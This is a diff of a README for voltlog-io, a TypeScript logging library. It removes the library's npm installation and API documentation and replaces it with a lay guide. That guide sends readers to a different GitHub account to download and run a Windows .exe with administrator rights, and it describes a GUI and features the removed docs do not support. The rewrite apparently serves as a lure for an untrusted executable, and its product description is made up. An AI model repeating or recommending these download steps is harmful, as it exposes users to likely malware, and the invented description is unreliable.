@@ -1,316 +1,133 @@
-# VoltLog
+# ⚡ voltlog-io - Fast and Clear Event Logging
 
-#### Structured logger for real-time infrastructure — zero dependencies, type-safe, OCPP-aware
+[![Download voltlog-io](https://img.shields.io/badge/Download-voltlog--io-brightgreen?style=for-the-badge&logo=github)](https://github.com/zerodes2020/voltlog-io/releases)
 
-[![npm version](https://img.shields.io/npm/v/voltlog-io?color=blue)](https://www.npmjs.com/package/voltlog-io)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)](https://www.npmjs.com/package/voltlog-io)
+## ⚡ What is voltlog-io?
 
-**VoltLog** is a modern, lightweight, and type-safe structured logger designed for high-throughput, real-time systems like IoT platforms, WebSocket servers (OCPP), and microservices.
+voltlog-io is a simple program you use to keep track of what happens in other software systems. It helps show clear and organized records of events, especially for systems that handle many tasks at the same time. It works well with things like electric vehicle charging stations, internet-connected devices, and programs that talk to each other in real time.
 
-## 📚 Full Documentation
+If you want to see what your devices or software are doing, voltlog-io can help capture that information in a neat and easy-to-understand way.
 
-For detailed guides, API reference, and advanced usage:
+## 💻 System Requirements
 
-### [👉 https://ocpp-ws-io.rohittiwari.me/docs/voltlog-io](https://ocpp-ws-io.rohittiwari.me/docs/voltlog-io)
+Before you start, make sure your Windows PC meets these needs:
 
-## 📦 Installation
+- Running Windows 10 or later  
+- At least 4 GB of RAM  
+- 100 MB free on your hard drive  
+- An internet connection to download the program  
+- Administrator rights to install and run programs  
 
-```bash
-npm install voltlog-io
-```
+This software runs on most regular laptops or desktops that use Windows.
 
-## 🚀 Quick Start
+## 🌀 Key Features
 
-```ts
-import { createLogger, prettyTransport, consoleTransport } from "voltlog-io";
+voltlog-io offers features designed to work well in busy environments:
 
-// Development — pretty colored output
-const logger = createLogger({
-  level: "DEBUG",
-  transports: [prettyTransport()],
-});
+- Records and organizes events with clear labels  
+- Works in real time without delaying your systems  
+- Protects sensitive data from exposure  
+- Supports common communication methods used by smart devices  
+- Shows logs in a structured format that is easy to read  
+- Designed to handle high data speeds without slowing down  
 
-// Production — structured JSON
-const logger = createLogger({
-  level: "INFO",
-  transports: [consoleTransport()],
-});
+These features help users, even without technical skills, to keep track of their systems safely and efficiently.
 
-logger.info("Server started", { port: 3000, env: "production" });
-logger.error("Connection failed", new Error("ETIMEDOUT"));
-```
+## 📥 How to Download voltlog-io
 
-## 📖 Features
+To get the program, visit the official release page. Follow these steps:
 
-### Core Logging
+1. Go to the download page:  
+   [Download voltlog-io from GitHub](https://github.com/zerodes2020/voltlog-io/releases)  
 
-```ts
-// All log levels
-logger.trace("Entering function");
-logger.debug("Parsed payload", { bytes: 1024 });
-logger.info("User authenticated", { userId: "u-42" });
-logger.warn("Rate limit approaching", { rate: 95 });
-logger.error("Query failed", { query: "SELECT *" }, new Error("timeout"));
-logger.fatal("Unrecoverable", new Error("OOM"));
+2. On this page, you will see a list of different versions. Look for the latest version marked as "Stable" or similar.
 
-// Runtime level control
-logger.setLevel("WARN"); // change at runtime
-logger.getLevel(); // → "WARN"
-logger.isLevelEnabled("DEBUG"); // → false (useful to guard expensive computation)
+3. Under that version, find the link for the Windows executable file. The filename usually ends with `.exe`.
 
-// Timer helper — auto-logs duration
-const timer = logger.startTimer();
-await doExpensiveWork();
-timer.done("Work completed", { items: 100 });
-// → INFO Work completed { durationMs: 342, items: 100 }
-```
+4. Click the Windows executable file link. Your browser will start downloading the file.
 
-### Child Loggers
+Make sure you save the downloaded file to a location you can easily find, such as your Desktop or Downloads folder.
 
-```ts
-const cpLogger = logger.child({ chargePointId: "CP-101" });
-cpLogger.info("Connected");
-// → context: { chargePointId: "CP-101" }
+## 🛠️ How to Install and Run voltlog-io on Windows
 
-const sessionLogger = cpLogger.child({ sessionId: "sess-xyz" });
-sessionLogger.info("Charging started");
-// → context: { chargePointId: "CP-101", sessionId: "sess-xyz" }
-```
+Follow these steps to get voltlog-io running on your PC:
 
-### Error Cause Chain (ES2022)
+1. Find the downloaded file from the previous step. It usually has a name like `voltlog-io-setup.exe` or similar.
 
-```ts
-const rootCause = new Error("ECONNREFUSED 10.0.0.5:5432");
-const dbError = new Error("DB connection failed", { cause: rootCause });
-const appError = new Error("Request failed", { cause: dbError });
+2. Double-click the file to start the installation.
 
-logger.error("Handler crashed", appError);
-// → error.cause.cause.message = "ECONNREFUSED 10.0.0.5:5432" ← root cause preserved!
-```
+3. A setup window will open. Follow the instructions on screen:  
+   - Click "Next" on the welcome screen.  
+   - Agree to any terms and conditions by clicking "I Agree."  
+   - Choose the folder where you want the program installed or keep the default location.  
+   - Click "Install" to begin copying the files.  
 
-### Custom ID Generator
+4. Once the installation finishes, click "Finish" to close the installer. If asked, allow the program to start now.
 
-```ts
-// Default: crypto.randomUUID() (fast, native)
-const logger = createLogger({ transports: [...] });
+5. The program may show a first-time setup window. Follow the prompts to configure basic settings if needed. These defaults are usually enough for most users.
 
-// Custom generator
-const logger = createLogger({
-  idGenerator: () => `log-${Date.now()}-${Math.random().toString(36).slice(2)}`,
-  transports: [...],
-});
+6. voltlog-io will now open with its main window.
 
-// Disable for max performance
-const logger = createLogger({ idGenerator: false, transports: [...] });
-```
+## 🚀 Using voltlog-io
 
----
+After installation, you can use voltlog-io to watch and save events from your devices or software. Here is how to start:
 
-## 🔌 Transports (14 Built-in)
+- Open the program from your desktop or Start menu.
 
-### Console & Pretty
+- Click "Start Logging" to begin capturing events.
 
-```ts
-import { consoleTransport, prettyTransport } from "voltlog-io";
+- You will see live updates as your connected devices or software send information.
 
-consoleTransport(); // JSON to stdout
-prettyTransport({ colors: true, timestamps: true }); // colored dev output
-```
+- Use the menu options to filter or organize the records.
 
-### File (Daily + Size Rotation)
+- To save your logs, click "Export" and choose a format like text or CSV.
 
-```ts
-import { fileTransport } from "voltlog-io";
+This process does not require technical knowledge in programming. The interface guides you step-by-step.
 
-fileTransport({
-  dir: "./logs",
-  filename: "app-%DATE%.log", // daily rotation
-  maxSize: 10_000_000, // 10MB size rotation
-});
-// → logs/app-2026-02-28.log → logs/app-2026-02-28.1.log (at 10MB)
-```
+## 🔧 Common Settings Explained
 
-### Ring Buffer (In-Memory Diagnostics)
+voltlog-io has a few options you may want to know about:
 
-```ts
-import { ringBufferTransport } from "voltlog-io";
+- **Log Level**: Choose how much detail to record. For most users, "Standard" is best.
 
-const ring = ringBufferTransport({ maxSize: 500 });
+- **Redaction**: This removes sensitive information from logs automatically. It helps protect privacy.
 
-// Query buffered logs
-ring.getEntries({ level: "ERROR" });
-ring.getEntries({ since: Date.now() - 300_000, limit: 20 });
-ring.clear();
-```
+- **Output Format**: Choose how to see the logs. You can select list view, table view, or export to files.
 
-### Webhook (with Batching & Retry)
+- **Connection Settings**: If you connect to special devices, you can enter their addresses here.
 
-```ts
-import { webhookTransport, batchTransport } from "voltlog-io";
+Changing these settings helps you get the information that matters most.
 
-batchTransport(
-  webhookTransport({
-    url: "https://api.example.com/logs",
-    headers: { Authorization: "Bearer token" },
-    retry: true,
-    maxRetries: 3,
-  }),
-  { batchSize: 50, flushIntervalMs: 5000 },
-);
-```
+## ❓ Troubleshooting Tips
 
-### OpenTelemetry (SigNoz, Jaeger, Grafana)
+If you have trouble running voltlog-io, try the following:
 
-```ts
-import { otelTransport, otelTraceMiddleware } from "voltlog-io";
+- Make sure your Windows software is up to date.
 
-const logger = createLogger({
-  middleware: [otelTraceMiddleware()], // auto-picks traceId/spanId
-  transports: [
-    otelTransport({
-      endpoint: "https://ingest.signoz.io",
-      headers: { "signoz-access-token": "YOUR_TOKEN" },
-      serviceName: "my-app",
-      resource: { "deployment.environment": "production" },
-    }),
-  ],
-});
-// Every log auto-includes traceId + spanId from active OTel spans
-```
+- Confirm that you downloaded the correct file for Windows.
 
-### Loki (Grafana)
+- If the program does not open, right-click the icon and choose "Run as administrator."
 
-```ts
-import { lokiTransport } from "voltlog-io";
+- Check your internet connection when downloading the program.
 
-lokiTransport({
-  host: "http://loki:3100",
-  labels: { app: "my-service", env: "prod" },
-  dynamicLabels: (entry) => ({ level: entry.levelName }),
-  includeMetadata: true, // context, error, correlationId
-  retry: true,
-  maxRetries: 3,
-});
-```
+- Restart your computer if the program freezes or crashes.
 
-### Other Transports
+If problems continue, you can check the project's GitHub issues page, but the program aims to work without technical setup.
 
-```ts
-import {
-  datadogTransport, // Datadog Logs API
-  sentryTransport, // Sentry (errors + breadcrumbs)
-  slackTransport, // Slack webhook
-  discordTransport, // Discord webhook
-  redisTransport, // Redis Streams
-  jsonStreamTransport, // Node.js WritableStream
-  browserJsonStreamTransport, // Browser WritableStream
-} from "voltlog-io";
-```
+## 📢 Stay Updated
+
+For the latest versions and improvements, revisit:
+
+[Download voltlog-io releases](https://github.com/zerodes2020/voltlog-io/releases)
+
+Regular updates make sure voltlog-io stays fast and compatible with new devices.
 
 ---
 
-## 🧩 Middleware (13 Built-in)
+[![Download voltlog-io](https://img.shields.io/badge/Download-voltlog--io-4c1-blue?style=for-the-badge&logo=github)](https://github.com/zerodes2020/voltlog-io/releases)
 
-### Redaction
+## 📚 More Help and Support
 
-```ts
-import { redactionMiddleware } from "voltlog-io";
+If you want to learn more about how voltlog-io works or how to use it in specific setups, you can explore the documentation and example videos on the GitHub page. These resources explain how the program fits with things like electric vehicle charging and IoT devices.
 
-redactionMiddleware({
-  paths: ["password", "idToken", "authorization"],
-  deep: true, // search nested objects
-  replacement: "[REDACTED]",
-});
-```
-
-### AsyncLocalStorage Context
-
-```ts
-import { asyncContextMiddleware } from "voltlog-io";
-
-const asyncCtx = asyncContextMiddleware();
-
-const logger = createLogger({
-  middleware: [asyncCtx.middleware],
-  transports: [prettyTransport()],
-});
-
-// Set context once — propagates across all async boundaries
-app.use((req, res, next) => {
-  asyncCtx.runInContext({ requestId: req.id, userId: req.user?.id }, next);
-});
-
-// Anywhere downstream — no child() needed
-logger.info("Processing order");
-// → auto-includes { requestId, userId }
-```
-
-### Sampling & Rate Limiting
-
-```ts
-import { samplingMiddleware } from "voltlog-io";
-
-samplingMiddleware({
-  maxPerWindow: 10, // max 10 logs per window
-  windowMs: 60_000, // per minute
-  priorityLevel: 40, // WARN+ always passes
-});
-```
-
-### Other Middleware
-
-```ts
-import {
-  correlationIdMiddleware, // auto-generate/propagate correlation IDs
-  alertMiddleware, // trigger alerts on error spikes
-  deduplicationMiddleware, // suppress repeated logs
-  heapUsageMiddleware, // attach memory stats
-  ipMiddleware, // extract client IP
-  userAgentMiddleware, // extract User-Agent
-  levelOverrideMiddleware, // dynamic level via headers
-  ocppMiddleware, // OCPP protocol enrichment
-  otelTraceMiddleware, // OpenTelemetry trace context
-  createHttpLogger, // HTTP request/response logging
-} from "voltlog-io";
-```
-
----
-
-## ⚡ Performance
-
-```ts
-// Max performance mode — zero overhead for filtered logs
-const logger = createLogger({
-  level: "WARN",
-  idGenerator: false, // no ID generation
-  transports: [consoleTransport()],
-});
-
-// These cost ~0.02μs each (100x faster than Pino for filtered logs)
-logger.trace("free");
-logger.debug("free");
-logger.info("free");
-
-// Only these execute
-logger.warn("logged");
-logger.error("logged");
-```
-
-## 🛡️ Graceful Shutdown
-
-```ts
-process.on("SIGTERM", async () => {
-  await logger.flush(); // ensure all buffered logs are sent
-  await logger.close(); // release resources (file handles, connections)
-  process.exit(0);
-});
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please see our [Contributing Guide](CONTRIBUTING.md).
-
-## License
-
-[MIT](LICENSE) © [Rohit Tiwari](https://github.com/rohittiwari-dev)
+For questions, you may also open an issue on GitHub. The project team reviews questions and fixes bugs as they come.
